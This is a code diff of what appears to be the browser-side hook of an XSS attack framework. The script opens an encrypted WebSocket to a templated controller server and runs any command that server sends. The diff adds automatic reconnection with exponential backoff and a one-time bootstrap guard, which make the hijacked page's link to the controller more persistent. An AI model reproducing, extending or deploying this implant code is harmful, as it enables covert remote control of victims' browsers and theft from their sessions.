@@ -3,6 +3,125 @@ var httpBase = "$hbase";
 var wsBase = "$wsbase";
 var mitmHost = "$mhost";
 var mitmPort = "$mport";
+var runtimeState = window.__SOXSS_RUNTIME__ || {
+    reconnectTimer: null,
+    reconnectAttempts: 0,
+    manualClose: false,
+    cryptoScriptPromise: null
+};
+window.__SOXSS_RUNTIME__ = runtimeState;
+
+function clearReconnectTimer() {
+    if (runtimeState.reconnectTimer) {
+        clearTimeout(runtimeState.reconnectTimer);
+        runtimeState.reconnectTimer = null;
+    }
+}
+
+function scheduleReconnect() {
+    if (runtimeState.manualClose || isMitmOrigin()) {
+        return;
+    }
+    if (runtimeState.reconnectTimer) {
+        return;
+    }
+
+    runtimeState.reconnectAttempts += 1;
+    const cappedAttempt = Math.min(runtimeState.reconnectAttempts, 6);
+    const baseDelay = Math.min(1000 * Math.pow(2, cappedAttempt - 1), 30000);
+    const jitter = Math.floor(Math.random() * 500);
+    const delay = baseDelay + jitter;
+
+    runtimeState.reconnectTimer = setTimeout(function () {
+        runtimeState.reconnectTimer = null;
+        connectSocket();
+    }, delay);
+}
+
+function ensureCryptoReadyAndSendHello() {
+    if (useCrypto) {
+        sendMessage({ type: 1 });
+        return;
+    }
+
+    if (typeof CryptoJS !== "undefined") {
+        if (initCrypto()) {
+            sendMessage({ type: 1 });
+        }
+        return;
+    }
+
+    if (!runtimeState.cryptoScriptPromise) {
+        runtimeState.cryptoScriptPromise = new Promise(function (resolve, reject) {
+            var cryptoScript = document.createElement("script");
+            cryptoScript.src = "https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js";
+            cryptoScript.onload = function () {
+                resolve(true);
+            };
+            cryptoScript.onerror = function () {
+                reject(false);
+            };
+            document.getElementsByTagName("head")[0].appendChild(cryptoScript);
+        });
+    }
+
+    runtimeState.cryptoScriptPromise
+        .then(function () {
+            if (initCrypto()) {
+                sendMessage({ type: 1 });
+            }
+        })
+        .catch(function () {
+            console.error("CryptoJS could not be loaded from CDN.");
+        });
+}
+
+function attachSocketHandlers(socket) {
+    socket.onopen = function () {
+        runtimeState.reconnectAttempts = 0;
+        clearReconnectTimer();
+        ensureCryptoReadyAndSendHello();
+    };
+
+    socket.onmessage = function (event) {
+        try {
+            const output = hex2a(decrypt(event.data));
+            let mes = JSON.parse(output);
+            _webs_Commands_[mes["Command"]](mes);
+        } catch (e) {
+            if (useCrypto) {
+                sendMessage({ type: 0, msg: { outputType: "error", text: e.toString() } });
+            } else {
+                console.error(e);
+            }
+        }
+    };
+
+    socket.onclose = function () {
+        scheduleReconnect();
+    };
+
+    socket.onerror = function () {
+        // onclose handles reconnect scheduling; keep error handler quiet.
+    };
+}
+
+function connectSocket() {
+    if (runtimeState.manualClose || isMitmOrigin()) {
+        return;
+    }
+    if (webSocket && (webSocket.readyState === 0 || webSocket.readyState === 1)) {
+        return;
+    }
+
+    try {
+        webSocket = new WebSocket(wsBase + "/$sid");
+        window.__SOXSS_SOCKET__ = webSocket;
+        attachSocketHandlers(webSocket);
+    } catch (e) {
+        scheduleReconnect();
+    }
+}
 
 function normalizeRuntimePort(protocol, port) {
     if (port) {
@@ -83,24 +202,8 @@ if (window.__SOXSS_BOOTSTRAPPED__) {
     window.__SOXSS_BOOTSTRAPPED__ = true;
 } else {
     window.__SOXSS_BOOTSTRAPPED__ = true;
-    webSocket = new WebSocket(wsBase + "/$sid");
-    window.__SOXSS_SOCKET__ = webSocket;
-
-    webSocket.onopen = (event) => {
-        // Dynamically load CryptoJS from CDN
-        var cryptoScript = document.createElement("script");
-        cryptoScript.src = "https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js";
-        cryptoScript.onload = function () {
-            if (initCrypto()) {
-                sendMessage({ type: 1 });
-            }
-        };
-        cryptoScript.onerror = function () {
-            // Keep connection alive and report load failure through backend once possible.
-            console.error("CryptoJS could not be loaded from CDN.");
-        };
-        document.getElementsByTagName("head")[0].appendChild(cryptoScript);
-    };
+    runtimeState.manualClose = false;
+    connectSocket();
     loadDefaultScripts();
 }
 
@@ -137,26 +240,15 @@ var _webs_Commands_ = {
     },
     "disable": function (mes) {
         try {
+            runtimeState.manualClose = true;
+            clearReconnectTimer();
             webSocket.close();
         } catch (e) { }
     }
 }
 
 if (webSocket && !webSocket.onmessage) {
-    webSocket.onmessage = (event) => {
-        try {
-            const output = hex2a(decrypt(event.data));
-            let mes = JSON.parse(output)
-            _webs_Commands_[mes["Command"]](mes)
-        } catch (e) {
-            if (useCrypto) {
-                sendMessage({ type: 0, msg: { outputType: "error", text: e.toString() } })
-            } else {
-                console.error(e)
-            }
-        }
-
-    };
+    attachSocketHandlers(webSocket);
 }
 
 
